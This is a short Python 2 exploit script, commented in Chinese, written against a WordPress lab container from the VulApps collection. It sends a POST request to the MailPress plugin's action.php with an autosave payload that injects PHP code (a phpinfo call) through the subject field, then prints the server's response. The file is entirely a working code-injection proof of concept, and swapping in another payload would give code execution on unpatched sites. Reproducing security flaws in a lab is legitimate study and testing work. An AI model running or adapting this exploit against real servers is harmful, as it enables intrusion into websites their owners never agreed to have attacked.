#!/usr/bin/env python
# -*- coding:utf-8 -*-
#python version 2.7.14
#脚本适用于docker下的vulapps环境，使用docker run -d -p 8012:80 medicean/vulapps:w_wordpress_2启动环境
#具体参见github地址：https://github.com/Medicean/VulApps/tree/master/w/wordpress/2
#此处ip为192.168.109.142
import sys
import urllib2
from cookielib import CookieJar


argc = len(sys.argv) - 1
argv = sys.argv[1:]
if argc == -1 or argc > 2:
    print "用法：python",sys.argv[0],"IP地址 端口号"
    print "例如：url为http://127.0.0.1:8080/，则IP地址应为127.0.0.1，端口号应为8080"
    sys.exit()

ip = "192.168.109.142"
port = 8012

if argc >= 1:
    ip = argv[0]
if argc == 2:
    port = argv[1]
	
c=CookieJar()
opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(c))
data="action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<?php phpinfo();?>&html=&plaintext=&mail_format=standard&autosave=1"
response=opener.open("http://"+ip+":"+port+"/wp-content/plugins/mailpress/mp-includes/action.php",data)
content=response.read()
print content


